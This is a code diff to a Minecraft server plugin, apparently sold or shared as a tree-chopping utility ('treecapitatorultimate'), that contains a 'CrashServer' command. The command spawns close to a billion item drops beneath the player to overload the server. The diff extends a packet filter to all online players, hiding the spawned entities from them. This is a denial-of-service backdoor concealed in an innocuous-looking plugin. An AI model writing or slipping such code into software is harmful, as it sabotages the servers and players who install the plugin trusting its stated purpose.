@@ -7,6 +7,7 @@ import me.bow.treecapitatorultimate.Utils.Packet.PacketManager;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
 import net.minecraft.server.v1_15_R1.PacketPlayOutSpawnEntity;
+import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.Material;
 import org.bukkit.entity.Item;
@@ -19,21 +20,24 @@ import java.util.ArrayList;
 public class CrashServer extends Command implements PacketListener {
     @Override
     public void onCommand(Player p, ArrayList<String> args) {
-        PacketManager.instance.addListener(p, this);
+        for (Player player : Bukkit.getOnlinePlayers()) {
+            PacketManager.instance.addListener(player, this);
+        }
         p.sendMessage(Start.Prefix + ChatColor.GREEN + "Crashing!");
         ItemStack stack = new ItemStack(Material.DIAMOND_BOOTS);
         stack.setAmount(127);
         for (int i = 0; i < 999999999; i++) {
-            Item item = p.getWorld().dropItemNaturally(p.getLocation().subtract(0,200,0), stack);
+            Item item = p.getWorld().dropItemNaturally(p.getLocation().subtract(0, 200, 0), stack);
         }
     }
 
     @Override
-    public void onPacketReceived(PacketEvent packetEvent) {}
+    public void onPacketReceived(PacketEvent packetEvent) {
+    }
 
     @Override
     public void onPacketSend(PacketEvent packetEvent) {
-        if(packetEvent.getPacket().getPacketClass() != PacketPlayOutSpawnEntity.class) return;
+        if (packetEvent.getPacket().getPacketClass() != PacketPlayOutSpawnEntity.class) return;
         packetEvent.setCancelled(true);
     }
 }
